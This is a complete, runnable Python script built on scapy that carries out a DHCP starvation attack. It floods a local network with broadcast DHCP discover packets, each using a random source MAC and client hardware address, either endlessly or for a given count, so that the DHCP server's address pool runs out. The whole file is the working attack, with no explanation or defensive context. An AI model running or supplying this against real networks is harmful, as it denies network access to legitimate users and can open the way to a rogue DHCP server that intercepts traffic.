#!/usr/bin/python

try:
        import argparse
        import logging
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
        from scapy.all import *
except ImportError,e:
        import sys
        sys.stdout.write("%s\n" %e)
        sys.exit(1)


def dhcp_starvation(count):
        conf.checkIPaddr = False
        dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
        if count == 0:
                sendp(dhcp_discover,loop = 1)
        else:
                for pkg in range(0,count):
                        sendp(dhcp_discover,loop = 0)


if __name__ ==  "__main__":
        parser = argparse.ArgumentParser()
        parser.add_argument('--count', '-c', action = 'store', dest = 'count', help = "Packet count to be sent", required = True)
        args = parser.parse_args()

        dhcp_starvation(int(args.count))
